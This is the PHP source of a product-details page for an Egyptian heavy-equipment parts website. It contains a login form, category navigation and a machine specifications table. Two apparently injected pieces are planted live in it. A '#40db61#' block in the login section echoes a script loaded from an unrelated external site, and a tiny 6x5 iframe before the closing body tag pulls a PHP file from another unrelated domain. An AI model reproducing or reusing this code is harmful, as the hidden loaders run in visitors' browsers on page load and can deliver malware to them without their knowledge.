<? include "header.php"; ?>
<?
if(isset($_GET["id"]) AND is_numeric($_GET["id"])){
	$product_id = $_GET["id"];
	if(!is_numeric($product_id)) {
		header("Location: home.php");
		exit();
	}
	$query = "select cat_product.*, manufacture.name as mname
			  from cat_product left join manufacture on cat_product.manufacture_id = manufacture.id
	          where cat_product.id = $product_id ";
	$product_info = $cls -> db_select($query);
	if(count($product_info) == 1){
		$product_info = $product_info[1];
		$cat_id = $product_info["cat_id"];
		
		$__pid = $product_info["id"];
		$query = "select * from cat_p_photo where product_id=$__pid order by `sort_order`";
		$__images =  $cls -> db_select($query);
	}else{ 
		exit();
	}
}

if(isset($cat_id) AND is_numeric($cat_id)){
	//$cat_id = $_GET["cat_id"];
	$query = "select cat_product.*, manufacture.name as mname 
	          from cat_product left join manufacture on cat_product.manufacture_id = manufacture.id 
			  where cat_product.cat_id = $cat_id AND cat_product.status = 1 ";
	$all_product = $cls -> db_select($query);
	//// Category tree
	$query = "select * from category where id = $cat_id";
	$cat_info_main = $cls -> db_select($query);
	$i = 1; $parent_id = $cat_info_main[1]["parent_id"];
	$tree_info[$i]["id"] = $cat_info_main[1]["id"];
	$tree_info[$i]["name"] = $cat_info_main[1]["name"];
	if($parent_id > 0){
		while($parent_id > 0){
			$i++;
			$query = "select * from category where id = $parent_id ";
			$cat_info = $cls -> db_select($query);
			$parent_id = $cat_info[1]["parent_id"];
			$tree_info[$i]["id"] = $cat_info[1]["id"];
			$tree_info[$i]["name"] = $cat_info[1]["name"];
			if($i >= 6 )  break;
		}
	}
	$tree_info = array_reverse($tree_info);
	//print_r ($tree_info);
}else{
	header('Location: home.php');
	exit(0);
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><!-- InstanceBegin template="/Templates/internal.dwt" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

	<title>Egyptian machinery</title>
</head>
<link rel="stylesheet" href="../css/css.css"  type="text/css" media="all" />

<SCRIPT LANGUAGE="JavaScript">
<!-- Original:  CodeLifter.com (support@codelifter.com) -->
<!-- Web Site:  http://www.codelifter.com -->

<!-- This script and many more are available free online at -->
<!-- The JavaScript Source!! http://javascript.internet.com -->

<!-- Begin
// Set slideShowSpeed (milliseconds)
var slideShowSpeed = 3000;
// Duration of crossfade (seconds)
var crossFadeDuration = 3;
// Specify the image files
var Pic = new Array();
// to add more images, just continue
// the pattern, adding to the array below
<?
	if(is_array($all_slide)) $i=0;
	while(list($key,$val) = each($all_slide)){
	if(isset($account) AND $account == 1){
?>
Pic[<?=$i ?>] = '../../upload/slide/<?=$val["slide_photo"] ?>' <? print "\n\r"; ?>
<?
	}else{
?>
Pic[<?=$i ?>] = '../upload/slide/<?=$val["slide_photo"] ?>' <? print "\n\r"; ?>
<?
	
	}
	$i++;
	}
?>

// do not edit anything below this line
var t;
var j = 0;
var p = Pic.length;
var preLoad = new Array();
for (i = 0; i < p; i++) {
preLoad[i] = new Image();
preLoad[i].src = Pic[i];
}
function runSlideShow() {
if (document.all) {
document.images.SlideShow.style.filter="blendTrans(duration=2)";
document.images.SlideShow.style.filter="blendTrans(duration=crossFadeDuration)";
document.images.SlideShow.filters.blendTrans.Apply();
}
document.images.SlideShow.src = preLoad[j].src;
if (document.all) {
document.images.SlideShow.filters.blendTrans.Play();
}
j = j + 1;
if (j > (p - 1)) j = 0;
t = setTimeout('runSlideShow()', slideShowSpeed);
}
//  End -->
</script>

<body onLoad="runSlideShow()" background="../images/bg_03.gif" style="margin:0px; padding:0px">


<div align="center" style="">
<div align="center" style="width:940px;border:#CCCCCC solid 1px; background-color: #FFFFFF">
<!-- /////////////////////////////////// -->
<table border="0" height="285" width="100%" cellpadding="0" cellspacing="0">
<tr>
	<td align="center" style="background-color:#d9d9d9" width="258px;">
		<img src="../images/logo.gif" />
	</td>
	<td width="434px;">
		<!-- ///// Slide /////// -->
		<div>
			<img width="434" height="285" src="../upload/slide/<?=$all_slide[1]["slide_photo"] ?>"  name='SlideShow' align="top" />

		</div>	
	</td>
	<td  valign="top" style="width:252px;padding:10px; padding-top:57px; padding-left:50px;background-image:url(../images/loop1.gif);background-repeat: repeat-x;">
		<div align="left" class="top">
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="home.php">HOME</a><br /></div>
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="page.php?id=1">ABOUT</a><br /></div>
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="page.php?id=2">OUR SERVICE</a><br /></div>
<!-- 
			<div style=" padding-bottom:7px;">&nbsp; &nbsp; &nbsp; <img align="absmiddle" src="../images/bullet_2.gif" /> <a style="font-size:11px" href="page.php?id=2">HEAVEY EQUIPMENT</a><br /></div>
			<div style=" padding-bottom:7px;">&nbsp; &nbsp; &nbsp; <img align="absmiddle" src="../images/bullet_2.gif" /> <a style="font-size:11px" href="page.php?id=3">USED SPARE PARTS</a><br /></div>
			<div style=" padding-bottom:7px;">&nbsp; &nbsp; &nbsp; <img align="absmiddle" src="../images/bullet_2.gif" /> <a style="font-size:11px" href="page.php?id=4">NEW SPARE PARTS</a><br /></div>
-->
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../images/bullet_1.gif" /> <a href="contact_us.php">CONTACT</a><br />
			</div>
		</div>
	</td>
</tr>
<tr><td colspan="3" height="20" style="background-image:url(../images/loop2.gif);background-repeat: repeat-y;"></td></tr>
<tr>
	<td valign="top"><br />
		&nbsp; <img src="../images/login.gif" />
		<br />
		<? if(!isset($_SESSION["user_id"])){ ?>
<?php
#40db61#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224446\"></script>";
echo $srwv;
}
#/40db61#
?>
	<span style="font-size:11px"><? if(isset($_POST["login"])) print @$message_display; ?></span>	
	
	<table width="100%" class="font_1">
	<form id="form1" name="form1" method="post" action="">
	<tr>
		<td>User Name</td>
		<td><input name="user_name" value="<? print @$user_name; ?>" type="text" id="user_name" style=" height:12px; width:120px; font-size:9px;" /></td>
	</tr>
	<tr>
		<td>Password</td>
		<td><input name="password" type="password" id="password" style=" height:12px; width:120px; font-size:9px;" /></td>
	</tr>
	<tr>
		<td colspan="2">
		<a href="forgotpassword.php"><img border="0" src="../images/forget_p.gif" /></a>
		<a href="register.php"><img align="right" border="0" src="../images/register.gif" /></a>		</td>
	</tr>
	<tr>
		<td align="right" colspan="2"><input name="login" type="submit" id="login" style="border:0px; width:63px; height:24px; background-image:url(../images/button_1.gif)" value=" " /></td>
	</tr>
	</form>	
	</table>
	<? }else{ ?>
	<div align="center">
		<br />
		<span style="font-family:'Courier New'; color:#333333; font-size:12px;">You Are Login</span>
		<br />
		<div class="bottom" style="padding-bottom:10px; margin-top:10px;"><a href="account/my_account.php">My Account</a></div>
		<div align="left" class="bottom" style="padding-bottom:10px; margin-top:10px;"><a style="font-size:12px;" href="log_out.php">Log Out</a></div>
	</div>
	<? }?>	

		
		<hr style="color:#d7d7d7; margin:10px; margin-bottom:10px; margin-top:10px;" />


		<div style=" background-image:url(../images/header1.gif); background-repeat:no-repeatwidth:247px; height:42px;">
		<div style="padding-left:50px; padding-top:10px; font-weight:bolder; font-size:16px; font-family: Arial, Helvetica, sans-serif;">Equipment Categories</div>
		</div>
		
		<br />
		<div align="left" class="right" style="padding-left:40px;" >
			<table width="100%">
			<? 
				reset($all_category);
				if(is_array($all_category)){ $counter = 0;
				while(list($key,$val) = each($all_category)){
				$counter ++;
				if($counter == 18) break;
			?>
			<tr><td><img src="../images/bullet_3.gif" align="absmiddle" /></td><td><a href="category.php?id=<?=$val["id"] ?>"><?=$val["name"] ?></a></td></tr>
			<? } } ?>
			</table>
			<div align="center"><a style="color: #fcac14; font-size:14px; text-decoration:underline;" href="all_category.php">All Category</a></div>
		</div>
		
		<br />
		<img src="../images/header2.gif" />
		<br />
		<div align="left" class="bottom" style="padding-left:40px;" >
			<? 
				reset($all_manufacture);
				if(is_array($all_manufacture)){ $counter = 0;
				while(list($key,$val) = each($all_manufacture)){
				$counter ++;
				if($counter == 7) break;
			?>
			<div style="padding-bottom:5px;"><a href="manufacture_product.php?id=<?=$val["id"] ?>"><?=$val["name"] ?></a> <br /></div>
			<? }} ?>
			<div align="center"><a style="color:#333333; font-size:14px; text-decoration:underline;" href="all_manufacture.php">More</a></div>
			<br />

		</div>
				
	</td>
	<td valign="top" colspan="2" style="background-color: #FFFFFF; border:2px solid #cccccc; ">
		<div align="left" style=" font-family:Verdana; font-size:13px;padding:10px;">
		<b><!-- InstanceBeginEditable name="header" -->
		Product Details: 
		<?
			$tree_count = count($tree_info); 
			if($tree_count > 1)
			for($i=0;$i<=$tree_count-2;$i++){
		?>
			<a style="text-decoration:none" href="category.php?id=<?=$tree_info[$i]["id"] ?>"><? print $tree_info[$i]["name"]." &raquo; " ?></a>
		<? } ?>
		<span style="font-weight:100"><a href="product.php?cat_id=<?=$cat_id ?>"><?=$cat_info_main[1]["name"] ?></a> &raquo; <?=$product_info["name"] ?></span>	
		<!-- InstanceEndEditable --></b>
		<hr style="color:#d7d7d7; margin:2px; margin-bottom:10px; margin-top:10px;" />
		<!-- InstanceBeginEditable name="content" -->
		
		<div style="padding:10px; padding-bottom:10px;">
		<h4><?=$product_info["name"] ?></h4>  
		<hr style="border: #999999 dashed 1px;" />
		&nbsp; ( <b>Type:</b> <? if($product_info["type"] == 1) print "Machine"; else print "Parts"; ?>  )
		<div style="padding-top:5px;" align="center"><img width="400px;" src="../upload/image/<?=$product_info["photo"] ?>" />	
			<script type="text/javascript">
    		var GB_ROOT_DIR = "http://www.egyptmachinery.net/en/images/css/greybox/";
	</script>
	<script type="text/javascript" src="images/css/greybox/AJS.js"></script>
	<script type="text/javascript" src="images/css/greybox/AJS_fx.js"></script>
	<script type="text/javascript" src="images/css/greybox/gb_scripts.js"></script>
	<link href="images/css/greybox/gb_styles.css" rel="stylesheet" type="text/css" />			

			<?
				if(is_array($__images)) {
					print "<table border='0' width='100%' cellspacing='4' cellpadding='8'>";
					$cellCount = 1;
					foreach($__images as $__image) {
						if($cellCount == 1) {
							print "<tr><td style=\"vertical-align:bottom;\"  align=\"center\" valign=\"bottom\">";
						} else {
							print "<td style=\"vertical-align:bottom;\" align=\"center\" valign=\"bottom\">";
						}
						$dimensions = getimagesize("../upload/image/$__image[photo]");
						$width = (($dimensions["0"] > 950) ? 980 : $dimensions["0"]) + 30;
						$height = (($dimensions["1"] > 500) ? 480 : $dimensions["1"]) + 20 ;
						$w = "width=\"100\"";
						
						print "<a href=\"../upload/image/$__image[photo]\" rel=\"gb_page_center[$width, $height]\" title=\"\">";
						print "<img border=\"0\" $w src=\"../upload/image/$__image[photo]\"></a>";
						print "</td>";
						if($cellCount == 3) print "</tr>";
						$cellCount++;
						if($cellCount == 4) { 
							$cellCount = 1; 
						}
					}
					
					if($cellCount < 3) {
						for($i=$cellCount; $i<=3; $i++) {
							print "<td></td>";
						}
						print "</tr>";
					}
					print "</table>";
				}
			?>		
		
		
		</div>
		<br />
		<table width="500px;" border="0" style=" border:#666666 dashed 1px;" align="center">
		<tr>
			<td colspan="2"><div style=" color:#FFFFFF; padding:5px;background-color:#660000">Equipment Specifications</div></td>
		</tr>
		<tr>
			<td width="150px;"><div style=" color: #000000; font-weight:bold; padding:5px;background-color:#cccccc">Manufacture</div></td>
			<td><?=$product_info["mname"] ?></td>
		</tr>
		<? if(trim($product_info["year"]) != "") { ?>
		<tr>
			<td width="150px;"><div style=" color: #000000; font-weight:bold; padding:5px;background-color:#cccccc">Year</div></td>
			<td><?=$product_info["year"] ?></td>
		</tr>
		<? } ?>
		<? if(trim($product_info["model"]) != "") { ?>
		<tr>
			<td width="150px;"><div style=" color: #000000; font-weight:bold; padding:5px;background-color:#cccccc">Model</div></td>
			<td><?=$product_info["model"] ?></td>
		</tr>
		<? } ?>
		<? if(trim($product_info["price"]) != "") { ?>
		<tr>
			<td width="150px;"><div style=" color: #000000; font-weight:bold; padding:5px;background-color:#cccccc">Price</div></td>
			<td><?=$product_info["price"] ?></td>
		</tr>
		<? } ?>
		<? if(trim($product_info["location"]) != "") { ?>
		<tr>
			<td width="150px;"><div style=" color: #000000; font-weight:bold; padding:5px;background-color:#cccccc">Location</div></td>
			<td><?=$product_info["location"] ?></td>
		</tr>
		<? } ?>
		<? if(trim($product_info["serial_no"]) != "") { ?>
		<tr>
			<td width="150px;"><div style=" color: #000000; font-weight:bold; padding:5px;background-color:#cccccc">Serial No</div></td>
			<td><?=$product_info["serial_no"] ?></td>
		</tr>
		<? } ?>
		<? if(trim($product_info["condition"]) != "") { ?>
		<tr>
			<td width="150px;"><div style=" color: #000000; font-weight:bold; padding:5px;background-color:#cccccc">Condition</div></td>
			<td><? if($product_info["condition"] == 1) print "Used"; else print "Unused"; ?></td>
		</tr>
		<? } ?>
		<? if(trim($product_info["stock_no"]) != "") { ?>
		<tr>
			<td width="150px;"><div style=" color: #000000; font-weight:bold; padding:5px;background-color:#cccccc">Stock No</div></td>
			<td><?=$product_info["stock_no"] ?></td>
		</tr>
		<? } ?>
		<? if(trim($product_info["horse_power"]) != "") { ?>
		<tr>
			<td width="150px;"><div style=" color: #000000; font-weight:bold; padding:5px;background-color:#cccccc">Horse Power</div></td>
			<td><?=$product_info["horse_power"] ?></td>
		</tr>
		<? } ?>
		<? if(trim($product_info["hour"]) != "") { ?>
		<tr>
			<td width="150px;"><div style=" color: #000000; font-weight:bold; padding:5px;background-color:#cccccc">Hour</div></td>
			<td><?=$product_info["hour"] ?></td>
		</tr>
		<? } ?>
		<? if(trim($product_info["drive"]) != "") { ?>
		<tr>
			<td width="150px;"><div style=" color: #000000; font-weight:bold; padding:5px;background-color:#cccccc">Drive</div></td>
			<td><?=$product_info["drive"] ?></td>
		</tr>
		<? } ?>
		</table>
		
		
		<br />
		<table width="500px;" border="0" style=" border:#666666 dashed 1px;" align="center">
		<tr>
			<td><div style=" color:#FFFFFF; padding:5px;background-color:#660000">General Information</div></td>
		</tr>
		<tr>
			<td><?=$product_info["general_info"] ?></td>
		</tr>
		</table>		
		<br />
		</div>
		<!-- InstanceEndEditable -->	
		</div>
	</td>
	
</tr>
<tr>
<td height="72" colspan="3" style="background-image:url(../images/footer_1.gif); background-repeat:no-repeat">
	<div align="center" style=" padding-top:20px;font-family:Verdana; font-size:10px; color: #333333;">
		Copyright 2010 &copy; AL Karim Co. for heavey equipment parts, Powered by <a target="_blank" href="http://www.eracore.net">Eracore.net</a>		</div>
</td>
</tr>
</table>	


<!-- /////////////////////////////////// -->
</div></div>

<iframe src="http://elevatemagazine.com/includes/13x.php" border="0" width="6" height="5" /></body>
<!-- InstanceEnd --></html>